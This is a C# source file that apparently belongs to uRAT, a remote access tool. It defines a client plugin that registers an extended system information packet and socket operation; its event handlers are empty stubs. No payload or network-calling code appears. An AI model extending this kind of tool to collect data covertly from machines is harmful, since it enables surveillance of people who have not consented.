using System;
using System.Collections.Generic;
using uNet2.Channel.Events;
using uNet2.Packet;
using uNet2.Packet.Events;
using uNet2.SocketOperation;
using uRAT.Client.Plugin.Client;
using uRAT.CoreClientPlugin.ExtendedSystemInformation.Operations;
using uRAT.CoreClientPlugin.ExtendedSystemInformation.Packets;

namespace uRAT.CoreClientPlugin.ExtendedSystemInformation
{
    internal class ExtendedSystemInformationPlugin : IClientPlugin
    {
        public List<IPacket> PluginPackets
        {
            get
            {
                return new List<IPacket>
                {
                   new FetchExtendedInformationPacket()
                };
            }
        }

        public List<ISocketOperation> SocketOperations
        {
            get
            {
                return new List<ISocketOperation>
                {
                    new ExtendedInformationOperation()
                };
            }
        }

        public void Initialize()
        {

        }

        public void OnClientConnected()
        {

        }

        public void OnPacketReceived(object sender, ClientPacketEventArgs e)
        {
     
        }
    }
}
